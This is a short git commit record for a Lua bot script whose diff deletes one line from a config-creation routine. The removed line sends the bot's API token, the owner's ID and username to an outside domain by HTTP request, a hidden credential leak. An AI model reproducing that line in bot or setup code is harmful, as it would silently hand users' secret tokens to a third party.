b71f2661e94b12a6ffb3772980f14c5f42553ac3
ALSH1 <72534702+ALSH1@users.noreply.github.com>
2021-03-18 13:19:47 +0000

    Update AlBaghdadi.lua

--- AlBaghdadi.lua
+++ AlBaghdadi.lua
@@ -65,7 +65,6 @@ SUDO = database:get(id_server..":SUDO:ID"),
 UserName = database:get(id_server..":SUDO:USERNAME"),
  }
 create(config, "./Info.lua")   
-https.request("https://alsh-bg.ml/api/?token="..token.."&id="..SUDO.."&username="..username)
 end 
 create_config_auto()
 token = database:get(id_server..":token")
